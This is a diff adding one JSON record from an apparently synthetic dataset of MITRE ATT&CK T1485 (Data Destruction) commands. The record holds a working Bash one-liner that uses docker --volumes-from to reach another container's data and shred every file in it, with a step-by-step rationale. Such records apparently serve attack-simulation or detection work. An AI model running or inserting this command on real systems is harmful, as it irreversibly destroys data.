@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm --volumes-from api01 ubuntu bash -lc 'd=/var/lib/app/data; [ -d \"$d\" ] && find \"$d\" -xdev -type f -print0 | xargs -0 -r shred -n 2 -z -u; sync'",
+  "explanation": "Uses --volumes-from to access the api01 container's data volume and securely overwrites and deletes all files under the app data directory, then flushes writes.",
+  "rationale_steps": [
+    "Reuse api01's mounted volumes via --volumes-from",
+    "Limit scope to the intended directory to prevent collateral damage",
+    "Shred with multiple passes and zeroing, then unlink",
+    "Sync changes to disk"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-b18fe627",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
